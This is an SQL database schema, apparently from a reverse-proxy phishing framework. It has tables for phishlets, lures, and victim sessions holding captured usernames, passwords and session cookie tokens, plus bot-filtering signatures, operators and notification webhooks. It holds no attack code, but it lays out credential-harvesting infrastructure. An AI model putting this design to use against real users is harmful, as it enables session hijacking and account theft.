CREATE TABLE IF NOT EXISTS sessions (
    id              TEXT    PRIMARY KEY,
    phishlet        TEXT    NOT NULL,
    lure_id         TEXT    NOT NULL DEFAULT '',
    remote_addr     TEXT    NOT NULL DEFAULT '',
    user_agent      TEXT    NOT NULL DEFAULT '',
    ja4_hash        TEXT    NOT NULL DEFAULT '',
    bot_score       REAL    NOT NULL DEFAULT 0,
    username        TEXT    NOT NULL DEFAULT '',
    password        TEXT    NOT NULL DEFAULT '',
    custom          TEXT    NOT NULL DEFAULT '{}',
    cookie_tokens   TEXT    NOT NULL DEFAULT '{}',
    body_tokens     TEXT    NOT NULL DEFAULT '{}',
    http_tokens     TEXT    NOT NULL DEFAULT '{}',
    puppet_id       TEXT    NOT NULL DEFAULT '',
    started_at      INTEGER NOT NULL,
    completed_at    INTEGER
);

CREATE INDEX IF NOT EXISTS idx_sessions_phishlet   ON sessions(phishlet);
CREATE INDEX IF NOT EXISTS idx_sessions_started_at ON sessions(started_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_completed  ON sessions(completed_at)
    WHERE completed_at IS NOT NULL;

CREATE TABLE IF NOT EXISTS lures (
    id              TEXT    PRIMARY KEY,
    phishlet        TEXT    NOT NULL,
    hostname        TEXT    NOT NULL DEFAULT '',
    path            TEXT    NOT NULL DEFAULT '/',
    redirect_url    TEXT    NOT NULL DEFAULT '',
    spoof_url       TEXT    NOT NULL DEFAULT '',
    ua_filter       TEXT    NOT NULL DEFAULT '',
    paused_until    INTEGER NOT NULL DEFAULT 0,
    params_key      BLOB
);

CREATE INDEX IF NOT EXISTS idx_lures_phishlet ON lures(phishlet);

CREATE TABLE IF NOT EXISTS phishlets (
    name            TEXT    PRIMARY KEY,
    yaml            TEXT    NOT NULL DEFAULT '',
    base_domain     TEXT    NOT NULL DEFAULT '',
    dns_provider    TEXT    NOT NULL DEFAULT '',
    hostname        TEXT    NOT NULL DEFAULT '',
    spoof_url       TEXT    NOT NULL DEFAULT '',
    enabled         INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS bot_signatures (
    ja4_hash    TEXT    PRIMARY KEY,
    description TEXT    NOT NULL DEFAULT '',
    added_at    INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS bot_telemetry (
    id              TEXT    PRIMARY KEY,
    session_id      TEXT    NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    collected_at    INTEGER NOT NULL,
    raw             TEXT    NOT NULL DEFAULT '{}'
);

CREATE INDEX IF NOT EXISTS idx_bot_telemetry_session ON bot_telemetry(session_id);

CREATE TABLE IF NOT EXISTS operators (
    name       TEXT    PRIMARY KEY,
    created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS operator_invites (
    token      TEXT    PRIMARY KEY,
    name       TEXT    NOT NULL
);

CREATE TABLE IF NOT EXISTS notify_channels (
    id          TEXT    PRIMARY KEY,
    type        TEXT    NOT NULL,
    url         TEXT    NOT NULL,
    auth_header TEXT    NOT NULL DEFAULT '',
    filter      TEXT    NOT NULL DEFAULT '[]',
    enabled     INTEGER NOT NULL DEFAULT 1,
    created_at  INTEGER NOT NULL
);
